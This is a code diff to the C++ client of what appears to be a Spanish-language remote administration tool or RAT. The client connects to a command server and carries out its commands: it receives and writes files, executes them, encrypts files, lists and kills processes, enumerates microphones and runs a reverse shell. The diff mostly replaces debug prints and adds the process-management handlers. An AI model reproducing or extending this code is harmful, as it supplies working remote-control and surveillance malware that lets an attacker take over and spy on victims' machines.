@@ -44,7 +44,7 @@ bool Cliente::bConectar(const char* cIP, const char* cPuerto) {
 
 	int iRes = getaddrinfo(cIP, cPuerto, &sAddress, &sServer);
 	if (iRes != 0) {
-		error();
+        DebugPrint("[X] getaddrinfo error");
 		return false;
 	}
 
@@ -56,7 +56,7 @@ bool Cliente::bConectar(const char* cIP, const char* cPuerto) {
 
 		if (connect(this->sckSocket, sP->ai_addr, sP->ai_addrlen) == -1) {
 			//No se pudo conectar
-			error();
+            DebugPrint("[X] No se pudo conectar");
 			continue;
 		}
 		//exito
@@ -85,9 +85,8 @@ void Cliente::MainLoop() {
         }
 
         //Espere el comando en modo block
-#ifdef ___DEBUG_
-        std::cout<<"Esperando comando\n";
-#endif
+        DebugPrint("[!] Esperando comando");
+
         int iRecibido = this->cRecv(this->sckSocket, cBuffer, sizeof(cBuffer), false);
 
         if (iRecibido <= 0 && GetLastError() != WSAEWOULDBLOCK) {
@@ -126,9 +125,7 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
         char *cBytes = pBuffer + iHeaderSize;
         if(this->fpArchivo != nullptr){
             int iEscrito = fwrite(cBytes, sizeof(char), iSize - iHeaderSize, this->fpArchivo);
-#ifdef ___DEBUG_
-        std::cout<<"[!] "<<iEscrito<<" escritos"<<std::endl;
-#endif
+            DebugPrint("[!] Escritos " + std::to_string(iEscrito));
         }
         return;
     }
@@ -144,34 +141,26 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
     if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Descargar_Archivo_Init){
         strIn = strSplit(std::string(pBuffer), '~', 4);
         if(strIn.size() == 3){
-#ifdef ___DEBUG_
-            std::cout<<"[!] Descargando archivo en ruta "<<strIn[1]<<" | size: "<<strIn[2]<<std::endl;
-#endif
+
+            DebugPrint("[!] Descargando archivo en ruta " + strIn[1] + " | size: " + strIn[2]);
+
             if((this->fpArchivo = fopen(strIn[1].c_str(), "wb")) == nullptr){
-#ifdef ___DEBUG_
-                std::cout<<"[X] No se pudo abrir el archivo "<<strIn[1]<<std::endl;
-                error();
-#endif
+                DebugPrint("[X] No se pudo abrir el archivo " + strIn[1]);
             }
         } else {
-#ifdef ___DEBUG_
-            std::cout<<"[X] Error parseando comando: "<<pBuffer<<std::endl;
-#endif
+            DebugPrint("[X] Error parseando comando: " + std::string(pBuffer));
         }
         return;
     }
 
-#ifdef ___DEBUG_
-        std::cout << "[SERVIDOR] " << pBuffer << "\n";
-#endif
+    DebugPrint("[SERVIDOR] " + std::string(pBuffer));
+
     strIn = strSplit(std::string(pBuffer), '~', 4);
 
     int iEnviado = 0;
     
     if(this->Comandos[strIn[0].c_str()] == EnumComandos::PING) {
-#ifdef ___DEBUG_
-        std::cout << "Ping\n";
-#endif
+        DebugPrint("[!]PING");
         std::string strComand = std::to_string(EnumComandos::PONG);
         strComand.append(1, '\\');
         iEnviado = this->cSend(this->sckSocket, strComand.c_str(), strComand.size()+1, 0, false);
@@ -246,7 +235,6 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
             strCommand.append(item);
             this->cSend(this->sckSocket, strCommand.c_str(), strCommand.size(), 0, true);
             Sleep(30);
-            //std::cout << strCommand << std::endl;
         }
         return;
     }
@@ -278,14 +266,12 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
 
     if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Ejecutar_Archivo){
         bool isOK = Execute(strIn[1].c_str(), strIn[2] == "1" ? 1 : 0);
-#ifdef ___DEBUG_
+
         if(isOK){
-            std::cout<<strIn[1]<<" - ejecutado"<<std::endl;
+            DebugPrint("[!] " + strIn[1] + " - ejecutado");
         } else {
-            std::cout<<"[X] Error ejecutando "<<strIn[1]<<std::endl;
-            error();
+            DebugPrint("[X] Error ejecutando " + strIn[1]);
         }
-#endif
         return;
     }
 
@@ -307,15 +293,32 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
         Crypt_Archivo(strIn[2], strIn[1][0], strIn[1][1], strIn[3]);
     }
     //#####################################################
+
+
+    //#####################################################
+    //#####################################################
+    //#        COMANDOS SUBMENU ADMIN PROCESOS            #
+
+    if (this->Comandos[strIn[0].c_str()] == EnumComandos::PM_Refrescar) {
+        std::string strProc = std::to_string(EnumComandos::PM_Lista);
+        strProc.append(1, '\\');
+        strProc += strProcessList();
+        iEnviado = this->cSend(this->sckSocket, strProc.c_str(), strProc.size(), 0, false);
+        return;
+    }
+    
+    if (this->Comandos[strIn[0].c_str()] == EnumComandos::PM_Kill) {
+        if (!EndProcess(atoi(strIn[1].c_str()))) {
+            DebugPrint("[X] No se pudo terminar el PID " + strIn[1]);
+        }
+        return;
+    }
+
     //#####################################################
 
 
     //Lista de dispositivos de entrada (mic)
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::Mic_Refre_Dispositivos) {
-#ifdef ___DEBUG_
-        std::cout << "MIC_DEVICES\n";
-#endif // ___DEBUG
-
         if (this->mod_Mic == nullptr) {
             this->mod_Mic = new Mod_Mic(this);
         }
@@ -378,17 +381,13 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
                     delete this->reverseSHELL;
                     this->reverseSHELL = nullptr;
                 }
-#ifdef ___DEBUG_
-                std::cout << "Shell eliminada :v\n";
-#endif
+                DebugPrint("[!] Shell terminada");
             }
         }
         return;
     }
 
-#ifdef ___DEBUG_
-    std::cout << "Enviados "<<iEnviado<<" bytes\n";
-#endif
+    DebugPrint("[!] Enviados " + std::to_string(iEnviado));
 }
 
 
